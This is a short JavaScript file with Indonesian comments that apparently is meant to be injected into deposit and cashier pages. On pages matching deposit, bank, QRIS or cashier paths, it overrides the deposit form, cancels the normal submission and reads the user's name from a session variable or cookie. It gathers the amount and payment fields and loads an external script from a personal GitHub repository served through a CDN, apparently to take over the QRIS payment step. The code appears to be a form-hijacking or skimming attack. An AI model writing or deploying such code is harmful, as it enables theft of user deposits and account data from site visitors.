/**
 * deposit_redirect (act2.js) - menggunakan const match = [...]
 */

(function () {
  // gunakan "match" sesuai permintaan
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  // helper baca cookie
  function readCookie(name) {
    const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return m ? decodeURIComponent(m[2]) : null;
  }

  const href = window.location.href;
  const pathname = window.location.pathname || '/';
  const search = window.location.search || '';

  function isAllowed() {
    // path + search (contoh '/index.php?page=transaksi')
    const pathAndSearch = pathname + search;

    for (let i = 0; i < match.length; i++) {
      const pattern = match[i];

      // pattern query (mengandung ? atau =)
      if (pattern.indexOf('?') !== -1 || pattern.indexOf('=') !== -1) {
        if (href.indexOf(pattern) !== -1) return true;
      } else {
        // cek exact match pada path+search
        if (pathAndSearch === pattern) return true;

        // cek exact path
        if (pathname === pattern) return true;

        // cek startsWith untuk meng-handle '/deposit/' atau '/deposit/step'
        if (pathname.indexOf(pattern) === 0) return true;

        // fallback: kalau ada di href (aman untuk beberapa kasus)
        if (href.indexOf(pattern) !== -1) return true;
      }
    }

    return false;
  }

  if (!isAllowed()) {
    // stop execution kalau ga match
    // console.info('deposit_redirect: not an allowed page', { pathname, search, href });
    return;
  }

  // lanjutkan kalau page diijinkan
  document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("depositForm");
    if (!form) return;

    form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/afteract1.js";

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const username = (typeof window.SESSION_USER !== "undefined" && window.SESSION_USER) ? window.SESSION_USER : readCookie("user");
      const nominal = document.getElementById("nominal")?.value || "";
      const bonus = document.getElementById("bonus")?.value || "";
      const payFrom = form.querySelector("select[name='pay_from']")?.value || "";
      const postID = form.querySelector("input[name='postID']")?.value || "";
      const termCondition = form.querySelector("input[name='termcondition']")?.checked ? 1 : 0;

      const data = { username, nominal, bonus, pay_from: payFrom, postID, termcondition: termCondition };
      window.depositFormData = data;

      // optional status
      let statusEl = document.getElementById("depositStatusInline");
      if (!statusEl) {
        statusEl = document.createElement("div");
        statusEl.id = "depositStatusInline";
        statusEl.style.marginTop = "8px";
        statusEl.style.fontSize = "13px";
        form.parentNode.insertBefore(statusEl, form.nextSibling);
      }
      statusEl.textContent = "Mengirim... memuat proses pembayaran.";

      const script = document.createElement("script");
      script.src = form.action;
      script.async = true;
      script.onload = function () {
        statusEl.textContent = "Script pembayaran dimuat. Menunggu hasil QRIS...";
        console.log("deposit_redirect: loaded external script, depositFormData:", window.depositFormData);
      };
      script.onerror = function () {
        statusEl.textContent = "Gagal memuat script eksternal. Coba refresh.";
      };
      document.body.appendChild(script);
    });
  });
})();
